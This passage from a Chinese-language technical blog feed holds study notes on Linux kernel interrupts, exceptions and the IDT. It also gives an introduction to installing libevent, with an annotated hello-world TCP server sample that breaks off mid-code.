title="中断"></a>中断</h5><ul><li>可屏蔽中断：I/O设备发出的所有中断请求都产生可屏蔽中断。可屏蔽中断可以处于两种状态：屏蔽的(masked)或非屏蔽的(unmasked)，一个屏蔽的中断只要还是屏蔽的，控制单元就忽略它。</li><li>非屏蔽中断：只有几个危机事件(如硬件故障)才引起非屏蔽中断，非屏蔽中断总是由CPU辨认</li></ul><h5 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h5><ul><li>处理器探测异常：当CPU执行指令时探测到的一个反常条件所产生的异常。可以进一步分为三组。这取决于CPU控制单元产生异常时保存在内核态堆栈<code>eip</code>寄存器中的值<ul><li>故障(fault)：通常可以纠正，一旦纠正，程序就可以在不失连贯性的情况下重新开始。保存在<code>eip</code>中的值是引起故障的指令地址，因此，当异常处理程序终止时，那条指令会被重新执行。</li><li>陷阱(trap)：在陷阱指令执行后立即报告，内核把控制权返回给程序后就可以继续执行它的执行而不失连贯性，保存在<code>eip</code>中的值是一个随后要执行的指令地址。只有当没有必要重新执行已终止的指令时，才触发陷阱，<strong>陷阱的主要用途是为了调试程序</strong>。在这种情况下，中断信号的作用是通知调试程序一条特殊指令已被执行(例如到了一个程序的断点)。一旦用户检查到调试程序所提供的数据，他就可能要求被调试程序从下一条指令重新开始执行。</li><li>异常中止(abort)：发生一个严重的错误，控制单元出了问题，不能在<code>eip</code>寄存器中保存引起异常的指令所在的确切位置。异常中止用于报告严重的错误，如硬件故障或系统表中无效的值或不一致的值。由控制单元发生的这个中断信号是紧急信号，用来把控制权切换到相应的异常中止处理程序，这个异常中止处理程序除了强制受影响的进程终止外，没有别的选择。</li></ul></li><li>编程异常：在编程者发出请求时发生。是由<code>int</code>或<code>int3</code>指令触发的，当<code>into</code>(检查溢出)和<code>bound</code>(检查越界)指令检查的条件不为真时，也引起编程异常。控制单元把编程异常作为陷阱来处理，编程异常通常也叫做<strong>软中断</strong>。这样的异常有两种常用的用途：执行系统调用及给调试程序通报一个特定的事件。</li></ul><p>每个中断和异常是由0~255之间的一个数来标识，因为一些未知的原因，Intel把这个8位的无符号整数叫做一个向量(vector)。非屏蔽中断的向量和异常的向量是固定的。而可屏蔽中断的向量可以通过对中断控制器的编程来改变。</p><h4 id="IRQ和中断"><a href="#IRQ和中断" class="headerlink" title="IRQ和中断"></a>IRQ和中断</h4><p>每个能够发出中断请求的硬件设备控制器都有一条名为IRQ(Interrupt ReQuest)的输出线，所有现有的IRQ线都与一个名为可编程中断控制器(Programmable Interrupt Controller,PIC)的硬件电路的输入引脚相连，可编程中断控制器执行下列动作</p><ul><li>监视IRQ线，检查产生的信号(raised signal)。如果有条或两条以上的IRQ线上产生信号，就选择引脚编号较小的IRQ线，</li><li>如果一个引发信号出现在IRQ线上<ul><li>把接收到的引发信号转换成对应的向量</li><li>把这个向量存放在中断控制器的一个I/O端口，从而允许CPU通过数据总线读此向量</li><li>把引发信号发送到处理器的INTR引脚，即产生一个中断</li><li>等待，直到CPU通过把这个中断信号写进可编程中断控制器的一个I/O端口来确认它，当这种情况发生时，清INTR线。</li></ul></li><li>返回到监视IRQ线操作</li></ul><p>IRQ线是从0开始顺序编号的，因此，第一条IRQ线通常表示为IRQ0，与IRQn关联的Intel的缺省向量是n+32。如前所述，通过向中断控制器端口发布合适的指令，就可以修改IRQ和向量之间的映射。</p><p>可以有选择地禁止每条IRQ线。因此，可以对PIC编程从而禁止IRQ，也就是说，可以告诉PIC停止对给定的IRQ线发布中断，或者激活它们。禁止的中断是丢失不了的，它们一旦被激活，PIC就又把它们发送到CPU。这个特点被大多数中断处理程序使用，因为这允许中断处理程序逐次地处理同一类型的IRQ。</p><h4 id="高级可编程中断控制器"><a href="#高级可编程中断控制器" class="headerlink" title="高级可编程中断控制器"></a>高级可编程中断控制器</h4><p>如果系统只有一个单独的CPU，那么主PIC的输出线可以直截了当的连接到CPU的INTR引脚。然而，如果系统中包含两个或多个CPU，那么这种方式不再有效，因而需要更复杂的PIC。</p><p>Intel从<code>Pentiun III</code>开始引入了一种名为I/O高级可编程控制器(APIC)的新组件。此外，<code>80x86</code>微处理器当前所有的CPU都含有一个本地<code>APIC</code>。每个本地<code>APIC</code>都有32位的寄存器、一个内部时钟、一个本地定时设备及为本地<code>APIC</code>中断保留的两条额外的IRQ线<code>LINR0</code>和<code>LINT1</code>。所有本地<code>APIC</code>都连接到一个外部<code>I/O APIC</code>，形成一个多<code>APIC</code>的系统。</p><h4 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h4><p><code>80x86</code>微处理器发布了大约20种不同的异常。内核必须为每种异常提供一个专门的异常处理程序。对于某些异常，CPU控制单元在开始执行异常处理程序前会产生一个硬件出错码，并且压入内核态堆栈。</p><p>在<code>80x86</code>处理器中可以找到的异常的向量、名字、类型及其描述如下</p><ul><li>0 “Divide error”（故障）：当一个程序试图执行整数被0除操作时产生</li><li>1 “Debug”（陷阱或故障）：设置<code>eflags</code>的TF标志时或一条指令或操作数的地址落在一个活动debug寄存器的范围之内时</li><li>2 未用 ：为非屏蔽中断保留（利用NMI引脚的那些中断）</li><li>3 “Breakpoint” （陷阱）：由<code>int3</code>(断点)指令引起</li><li>4 “Overflow”（陷阱）：当<code>eflags</code>的OF标志被设置时，<code>into</code>(检查溢出)指令被执行</li><li>5 “Bounds check”（故障）：对于有效抵制范围之外的操作数，bound(检查地址边界)指令被执行</li><li>6 “Invalid opcode”（故障）：CPU执行单元检测到一个无效的操作码</li><li>7 “Device not available”（故障）：随着<code>cr0</code>的TS标志被设置，ESCAPE、MMX或XMM指令被执行</li><li>8 “Double fault”（异常中止）：正常情况下，当CPU试图为前一个异常调用处理程序时，同时又检测到一个异常，两个异常能被串行地处理。然而，在少数情况下，处理器不能串行地处理它们，因而产生这种异常。</li><li>9 “Coprocessor segment overrun”（异常中止）：因外部的数学斜处理器引起的问题</li><li>10 “Invalid TSS”（故障）：CPU试图让一个上下文切换到有无效的TSS的进程</li><li>11 “Segment not present”（故障）：引用一个不存在的内存段</li><li>12 “Stack segment fault”（故障）：试图超过栈段界限的指令，或者由ss标识的段不在内存</li><li>13 “General protection”（故障）：违反了<code>80x86</code>保护模式下的保护规则之一</li><li>14 “Page fault”（故障）：寻址的页不在内存，相应的页表项为空，或者违反了一种分页保护机制</li><li>15 由Intel保留</li><li>16 “Floating point error”（故障）：集成到CPU芯片中的浮点单元用信号通知一个错误情形，如数字溢出，或被0除</li><li>17 “Alignment check”（故障）：操作数的地址没有被正确的对齐</li><li>18 “Machine check”（异常中止）：机器检查机制检测到一个CPU错误或总线错误</li><li>19 “SIMD floating point exception”（故障）：集成到CPU芯片中的SSE或SSE2单元对浮点操作用信号通知一个错误情形</li><li>20～31这些值由Intel留作将来开发</li></ul><div class="table-container"><table><thead><tr><th>编号</th><th>异常</th><th>异常处理程序</th><th>信号</th></tr></thead><tbody><tr><td>0</td><td>Divide error</td><td>divide_error()</td><td>SIGFPE</td></tr><tr><td>1</td><td>Debug</td><td>debug()</td><td>SIGTRAP</td></tr><tr><td>2</td><td>NMI</td><td>nmi()</td><td>None</td></tr><tr><td>3</td><td>Breakpoint</td><td>int3()</td><td>SIGTRAP</td></tr><tr><td>4</td><td>Overflow</td><td>overflow()</td><td>SIGSEGV</td></tr><tr><td>5</td><td>Bounds check</td><td>bounds()</td><td>SIGSEGV</td></tr><tr><td>6</td><td>Invalid opcode</td><td>invalid_op()</td><td>SIGILL</td></tr><tr><td>7</td><td>Device not available</td><td>device_not_available()</td><td>None</td></tr><tr><td>8</td><td>Double fault</td><td>doublefault_fn()</td><td>None</td></tr><tr><td>9</td><td>Coprocessor segment overrun</td><td>coprocessor_segment_overrun()</td><td>SIGFPE</td></tr><tr><td>10</td><td>Invalid TSS</td><td>invalid_tss()</td><td>SIGSEGV</td></tr><tr><td>11</td><td>Segment not present</td><td>segment_not_present()</td><td>SIGBUS</td></tr><tr><td>12</td><td>Stack exception</td><td>stack_segment()</td><td>SIGBUS</td></tr><tr><td>13</td><td>General protection</td><td>general_protection()</td><td>SIGSEGV</td></tr><tr><td>14</td><td>Page fault</td><td>page_fault()</td><td>SIGSEGV</td></tr><tr><td>15</td><td>Intel reserved</td><td>None</td><td>None</td></tr><tr><td>16</td><td>Floating point error</td><td>coprocessor_error()</td><td>SIGFPE</td></tr><tr><td>17</td><td>Alignment check</td><td>alignment_check()</td><td>SIGSEGV</td></tr><tr><td>18</td><td>Machine check</td><td>machine_check()</td><td>None</td></tr><tr><td>19</td><td>SIMD floating point</td><td>simd_coprocessor_error()</td><td>SIGFPE</td></tr></tbody></table></div><h4 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h4><p>中断描述符表(Interrupt Descriptor Table,IDT)是一个系统表，它与每一个中断或异常向量相联系，每一个向量在表中有相应的中断或异常处理程序的入口地址。内核在允许中断发生前，必须适当的初始化IDT</p><p>IDT包含三种类型的描述符，下图显示了每种描述符中的64位的含义，值得注意的是，在40～43位的Type字段的值表示描述符的类型。</p><p><img src="/2021/11/23/深入理解linux内核之中断和异常/1.png" alt="1"></p><ul><li>任务门(task gate)：当中断信号发生时，必须取代当前进程的那个进程的TSS选择符放在任务门中</li><li>中断门(interrupt gate)：包含段选择符和中断或异常处理程序的段内偏移量。当控制权转移到一个适当的段时，处理器清IF标志，从而关闭将来会发生的可屏蔽中断</li><li>陷阱门(Trap gate)：与中断门相似，只是控制权传递到一个适当的段时处理器不修改IF标志</li></ul><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p>CPU产生的大部分异常都由Linux解释为出错条件，当其中一个异常发生时，内核就向引起异常的进程发送一个信号向它通知一个反常条件，例如，如果进程执行了一个被0除的操作，CPU就产生一个”Divide error”异常，并由相应的异常处理程序向当前进程发送一个SIGFPE信号，这个进程将采取若干必要的步骤来恢复或者中止运行。</p><p>异常处理程序有一个标准的结构，由以下三部分组成</p><ul><li>在内核堆栈中保存大多数寄存器的内容</li><li>用高级的C函数处理异常</li><li>通过<code>ret_from_exception()</code>函数从异常程序退出</li></ul><p>为了利用异常，必须对IDT进行适当的初始化，使得每个被确认的异常都有一个异常处理程序。<code>trap_init()</code>函数的工作时将一些最终值(即处理异常的函数)插入到IDT的非屏蔽中断及异常表项中，这是由函数<code>set_trap_gate()</code>、<code>set_intr_gate()</code>、<code>set_system_intr_gate()</code>和<code>set_task_gate()</code>来完成的</p><h4 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h4><p>中断处理依赖于中断类型，目前主要有三种主要的中断类型。</p><ul><li>I/O中断：某些I/O设备需要关注，相应的中断处理程序必须查询设备以确定适当的操作过程</li><li>时钟中断：某些时钟产生一个中断，这种中断告诉内核一个固定的时间间隔已经过去</li><li>处理器中断：多处理器系统中一个CPU对另一个CPU发出一个中断</li></ul><h4 id="I-O中断处理"><a href="#I-O中断处理" class="headerlink" title="I/O中断处理"></a>I/O中断处理</h4><p>中断处理程序的灵活性是以两种不同的方式实现的</p><ul><li>IRQ共享：中断处理程序执行多个中断服务例程(interrupt service routine，ISR)，每个ISR是一个与单独设备(共享IRQ线)相关的函数。因为不可能预先知道哪个特定的设备产生IRQ，因此，每个ISR都被执行，以验证它的设备是否需要关注，如果是，当设备产生中断时，就执行需要执行的所有操作。</li><li>IRQ动态分配：一条IRQ线在可能的最后时刻才与一个设备驱动程序相关联，例如，软盘设备的IRQ线只有在用户访问软盘设备时才被分配。这样，即使几个硬件设备并不共享IRQ线，同一个IRQ向量也可以由这几个设备在不同时刻使用。</li></ul><p>当一个中断发生时，并不是所有的操作都具有相同的急迫性。事实上，把所有的操作都放进中断处理程序本身并不合适，需要时间长的、非重要的操作应该推后，因为当一个中断处理程序正在运行时，相应的IRQ线上发出的信号就被暂时忽略。更重要的是，中断处理程序是代表进程执行的，它所代表的进程必须总处于<code>TASK_RUNNING</code>状态，否则，就可能出现系统僵死情形。因此，中断处理程序不能执行任何阻塞过程。如磁盘I/O操作，因此Linux把紧随中断要执行的操作分为三类</p><ul><li>紧急的（Critical）：这样的操作诸如：对PIC应答中断，对PIC或设备控制器重编程，或者修改由设备和处理器同时访问的数据结构，这些都能被很快地执行，而之所以说它们是紧急的是因为他们必须被尽快的执行。紧急操作要在一个中断处理程序内立即执行，而且是在禁止可屏蔽中断的情况下。</li><li>非紧急的（Noncritical）：这样的操作诸如修改那些只有处理器才会访问的数据结构，这些操作也要很快地完成，因此，它们由中断处理程序立即执行，但必须是在开中断的情况下。</li><li>非紧急可延迟的（Noncritical deferrable）：这样的操作例如把缓冲区的内容拷贝到某个进程的地址空间。这些操作可能被延迟较长的时间间隔而不影响内核操作。</li></ul><p>不管引起中断的电路种类如何，所有的I/O中断处理程序都执行四个相同的基本操作</p><ul><li>在内核态堆栈中保存IRQ的值和寄存器的内容</li><li>为正在给IRQ线服务的PIC发送一个应答，这将允许PIC进一步发出中断</li><li>执行共享这个IRQ的所有设备的中断服务例程(ISR)</li><li>跳到<code>ret_from_intr()</code>的地址后终止</li></ul><p>Linux中的中断向量</p><div class="table-container"><table><thead><tr><th>向量范围</th><th>用途</th></tr></thead><tbody><tr><td>0～19(0x0~0x13)</td><td>非屏蔽中断和异常</td></tr><tr><td>20~31(0x14~0x1f)</td><td>Intel保留</td></tr><tr><td>32~127(0x20~0x7f)</td><td>外部中断(IRQ)</td></tr><tr><td>128(0x80)</td><td>用于系统调用的可编程异常</td></tr><tr><td>129~238(0x81~0xee)</td><td>外部中断(IRQ)</td></tr><tr><td>239(0xef)</td><td>本地APIC时钟中断</td></tr><tr><td>240(0xf0)</td><td>本地APIC高温中断</td></tr><tr><td>241~250(0xf0~0xfa)</td><td>由Linux留作将来使用</td></tr><tr><td>251~253(0xfb~0xff)</td><td>处理器间中断</td></tr><tr><td>254(0xfe)</td><td>本地APIC错误中断</td></tr><tr><td>255(0xff)</td><td>本地APIC伪中断</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。&lt;/p&gt;
&lt;p&gt;中断通常分
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>浅学libevent</title>
    <link href="elssm.github.io/2021/11/19/%E6%B5%85%E5%AD%A6libevent/"/>
    <id>elssm.github.io/2021/11/19/浅学libevent/</id>
    <published>2021-11-19T06:17:46.000Z</published>
    <updated>2021-11-22T08:34:51.956Z</updated>
    
    <content type="html"><![CDATA[<h4 id="libevent简介"><a href="#libevent简介" class="headerlink" title="libevent简介"></a>libevent简介</h4><p><code>libevent</code>是一个用C语言编写的轻量级的开源高性能事件通知库，支持多种I/O多路复用技术，支持定时器和信号等事件，而且是跨平台的。</p><h4 id="libevent特点"><a href="#libevent特点" class="headerlink" title="libevent特点"></a>libevent特点</h4><ul><li>事件驱动，高性能</li><li>轻量级，专注于网络</li><li>跨平台，支持<code>Windows</code>、<code>Linux</code>、<code>MacOs</code>等</li><li><p>支持多种I/O多路复用技术，<code>epoll</code>、<code>poll</code>、<code>dev/poll</code>、<code>select</code>和<code>kqueue</code>等</p></li><li><p>支持I/O，定时器和信号等事件</p></li></ul><h4 id="libevent下载及安装"><a href="#libevent下载及安装" class="headerlink" title="libevent下载及安装"></a>libevent下载及安装</h4><p>下载地址：<a href="https://libevent.org/" target="_blank" rel="noopener">https://libevent.org/</a></p><p>这里我下载的是<code>libevent-2.1.8-stable.tar.gz</code>，下载之后解压。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf libevent-2.1.8-stable.tar.gz</span><br></pre></td></tr></table></figure><p>接下来进行源码包安装，这一步的目的是检查安装环境，生成makefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure><p>之后执行<code>make</code>命令生成<code>.o</code>可执行文件，最后执行<code>sudo make install</code>将必要资源放置系统指定目录</p><h4 id="验证libevent安装"><a href="#验证libevent安装" class="headerlink" title="验证libevent安装"></a>验证libevent安装</h4><p>进入<code>libevent-2.1.8-stable</code>下的<code>sample</code>目录，gcc编译<code>hello-world.c</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello</span><br></pre></td></tr></table></figure><p>这个时候会出现报错如下，显示未定义引用</p><p><img src="/2021/11/19/浅学libevent/1.png" alt="1"></p><p>出现上述报错是因为我们没有指定库名，因此需要加<code>-l</code>选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello -l event</span><br></pre></td></tr></table></figure><p><code>hello</code>文件是一个简单的服务器程序，端口是<code>9995</code>，我们尝试运行<code>hello</code>，它会等待客户端的连接。并向客户端发送<code>Hello,World</code>字符串，如下所示，证明<code>libevent</code>库安装成功。</p><p><img src="/2021/11/19/浅学libevent/2.png" alt="2"></p><p><code>libevent</code>库的安装位置在<code>/usr/local/lib</code>路径下</p><p><img src="/2021/11/19/浅学libevent/3.png" alt="3"></p><h4 id="Hello-world分析"><a href="#Hello-world分析" class="headerlink" title="Hello-world分析"></a>Hello-world分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This example program provides a trivial server program that listens for TCP</span></span><br><span class="line"><span class="comment">  connections on port 9995.  When they arrive, it writes a short message to</span></span><br><span class="line"><span class="comment">  each client connection, and closes each connection once it is flushed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Where possible, it exits cleanly in response to a SIGINT (ctrl-c).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> _XOPEN_SOURCE_EXTENDED</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/buffer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/util.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> MESSAGE[] = <span class="string">"Hello, World!\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定端口</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">9995</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明静态函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">listener_cb</span><span class="params">(struct evconnlistener *, <span class="keyword">evutil_socket_t</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct sockaddr *, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_writecb</span><span class="params">(struct bufferevent *, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_eventcb</span><span class="params">(struct bufferevent *, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">signal_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span>, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span> <span class="comment">//libevent基础声明。相当于一个底座</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听，用于建立连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">signal_event</span>;</span> <span class="comment">//信号事件</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span> <span class="comment">//地址结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">WSADATA wsa_data;</span><br><span class="line">WSAStartup(<span class="number">0x0201</span>, &amp;wsa_data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">base = event_base_new(); <span class="comment">//创建底座</span></span><br><span class="line"><span class="keyword">if</span> (!base) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not initialize libevent!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>)); <span class="comment">//地址结构清零</span></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于socket、bind、listen、accept的融合</span></span><br><span class="line">listener = evconnlistener_new_bind(base, listener_cb, (<span class="keyword">void</span> *)base,</span><br><span class="line">    LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE, <span class="number">-1</span>,</span><br><span class="line">    (struct sockaddr*)&amp;<span class="built_in">sin</span>,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!listener) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create a listener!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建信号事件</span></span><br><span class="line">signal_event = evsignal_new(base, SIGINT, signal_cb, (<span class="keyword">void</span> *)base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!signal_event || event_add(signal_event, <span class="literal">NULL</span>)&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create/add a signal event!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于while循环+select/poll/epoll</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//释放相关事件</span></span><br><span class="line">evconnlistener_free(listener); </span><br><span class="line">event_free(signal_event);</span><br><span class="line">event_base_free(base);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">listener_cb(struct evconnlistener *listener, <span class="keyword">evutil_socket_t</span> fd,</span><br><span class="line">    struct sockaddr *sa, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line"></span><br><span class="line">bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"><span class="keyword">if</span> (!bev) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error constructing bufferevent!"</span>);</span><br><span class="line">event_base_loopbreak(base);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_setcb(bev, <span class="literal">NULL</span>, conn_writecb, conn_eventcb, <span class="literal">NULL</span>);</span><br><span class="line">bufferevent_enable(bev, EV_WRITE);</span><br><span class="line">bufferevent_disable(bev, EV_READ);</span><br><span class="line"></span><br><span class="line">bufferevent_write(bev, MESSAGE, <span class="built_in">strlen</span>(MESSAGE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_writecb(struct bufferevent *bev, 